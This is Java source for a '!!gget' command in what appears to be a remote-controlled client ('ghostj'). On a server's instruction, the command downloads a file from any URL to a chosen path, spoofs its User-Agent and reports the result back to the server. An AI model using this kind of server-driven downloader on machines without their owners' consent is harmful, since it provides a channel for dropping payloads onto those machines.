package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.conn.HandleConn;
import com.ghostj.client.core.ClientMain;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Date;

/**
 * http下载器
 */
public class FuncGGet implements AbstractFunc {
    @Override
    public String getFuncName() {
        return "!!gget";
    }

    @Override
    public String[] getParamsModel() {
        return new String[]{"<url>","saveDir>","<saveName>"};
    }

    @Override
    public String getDescription() {
        return null;
    }

    @Override
    public int getMinParamsAmount() {
        return 3;
    }

    @Override
    public void run(String[] params, String cmd, AbstractProcessor processor) {
        try {
            HandleConn.writeToServer("正在下载\n");
            new Thread(() -> {
                try {
                    downLoadFromUrl(params[0], params[2], params[1], "dl"+new Date().getTime());
                    HandleConn.writeToServer("完成\n");
                }catch (Exception e) {
                    e.printStackTrace();
                    try {
                        HandleConn.writeToServer("下载出错\n" + ClientMain.getErrorInfo(e));
                    }catch (Exception err){}
                }
            }).start();
        } catch (Exception e) {
            HandleConn.writeToServerIgnoreException("下载出错\n" + ClientMain.getErrorInfo(e));
        }
        HandleConn.sendFinishToServer();
    }
    /**
     * 从网络Url中下载文件
     * @param urlStr
     * @param fileName
     * @param savePath
     * @throws IOException
     */
    public static void  downLoadFromUrl(String urlStr,String fileName,String savePath,String toekn) throws IOException{
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        //设置超时间为3秒
        conn.setConnectTimeout(3*1000);
        //防止屏蔽程序抓取而返回403错误
        conn.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)");
        conn.setRequestProperty("lfwywxqyh_token",toekn);
        //输入流
        DataInputStream dataInputStream=new DataInputStream(conn.getInputStream());
        //创建文件输出流
        // 文件保存位置
        File saveDir = new File(savePath);
        if(!saveDir.exists()){
            saveDir.mkdir();
        }
        File file = new File(saveDir+File.separator+fileName);
        FileOutputStream fos = new FileOutputStream(file);

        byte[] data=new byte[1024];
        int len=0;
        while ((len=dataInputStream.read(data,0,data.length))!=-1){
            fos.write(data,0,len);
            fos.flush();
        }
        if(fos!=null){
            fos.close();
        }
        if(dataInputStream!=null){
            dataInputStream.close();
        }
        /*//得到输入流
        InputStream inputStream = conn.getInputStream();
        //获取自己数组
        byte[] getData = readInputStream(inputStream);

        //文件保存位置
        File saveDir = new File(savePath);
        if(!saveDir.exists()){
            saveDir.mkdir();
        }
        File file = new File(saveDir+File.separator+fileName);
        FileOutputStream fos = new FileOutputStream(file);
        fos.write(getData);
        */
    }
    /**
     * 从输入流中获取字节数组
     * @param inputStream
     * @return
     * @throws IOException
     */
    public static  byte[] readInputStream(InputStream inputStream) throws IOException {
        byte[] buffer = new byte[1024];
        int len = 0;
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        while((len = inputStream.read(buffer)) != -1) {
            bos.write(buffer, 0, len);
        }
        bos.close();
        return bos.toByteArray();
    }
}
